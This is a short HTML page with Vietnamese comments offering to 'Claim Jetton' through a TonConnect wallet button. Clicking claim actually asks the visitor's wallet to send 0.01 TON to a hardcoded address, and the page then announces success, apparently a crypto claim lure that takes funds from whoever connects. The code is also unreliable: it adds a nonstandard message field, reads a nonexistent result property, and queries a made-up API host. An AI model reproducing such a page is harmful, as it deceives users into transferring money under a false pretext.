<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Jetton</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f7f7f7;
        }

        h1 {
            margin-bottom: 20px;
            font-size: 24px;
        }

        #ton-connect {
            margin-bottom: 20px;
        }

        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>
    <h1>Claim Jetton</h1>
    <!-- TonConnect UI Button -->
    <div id="ton-connect"></div>
    <button id="claimButton">Claim Jetton</button>

    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script>
        // Khởi tạo TonConnectUI
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://bmasshd.click/tonconnect-manifest.json',  // URL của manifest
            buttonRootId: 'ton-connect',  // ID của phần tử mà TonConnect UI sẽ tạo nút kết nối
        });

     // Gửi TON và nhận lại Jetton
async function sendAndClaimBack() {
    const jettonAddress = "EQAYMm97oiPgHWkjjzi0GRCc5wdBBNebv7rUiz7_Uig5a1pD";  // Địa chỉ hợp đồng Jetton
    const userAddress = "UQDu8vyZSZbAYvRRQ_jW4_0EiBGibAGq72wSZjYWRmNAGhRD";  // Địa chỉ người dùng gửi

    const amountToSend = "10000000";  // 0.01 TON (đổi ra nanotons)

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,  // Hết hạn sau 60 giây
        messages: [
            {
                address: userAddress,  // Địa chỉ người nhận
                amount: amountToSend,   // Số lượng TON gửi đi
                jettonAddress: jettonAddress  // Địa chỉ hợp đồng Jetton
            }
        ]
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Giao dịch đã được gửi:', result);

        if (result && result.transactionId) {
            // Kiểm tra giao dịch trên blockchain
            const isTransactionConfirmed = await checkTransactionStatus(result.transactionId);

            if (isTransactionConfirmed) {
                alert('Giao dịch thành công! Bạn đã nhận được Jetton.');
            } else {
                alert('Giao dịch chưa xác nhận.');
            }
        } else {
            alert('Có lỗi xảy ra khi gửi giao dịch.');
        }
    } catch (error) {
        console.error('Lỗi khi xử lý giao dịch:', error);
        alert('Có lỗi xảy ra khi gửi giao dịch.');
    }
}

// Hàm kiểm tra trạng thái giao dịch trên blockchain
async function checkTransactionStatus(transactionId) {
    try {
        const response = await fetch(`https://api.ton.blockchain/transaction/${transactionId}`);
        const data = await response.json();
        return data && data.status === 'confirmed';
    } catch (error) {
        console.error('Lỗi khi kiểm tra trạng thái giao dịch:', error);
        return false;
    }
}


        // Gắn sự kiện cho nút "Claim Jetton"
        document.getElementById('claimButton').addEventListener('click', sendAndClaimBack);

        // Tạo nút kết nối ví
        tonConnectUI.render();
    </script>
</body>
</html>
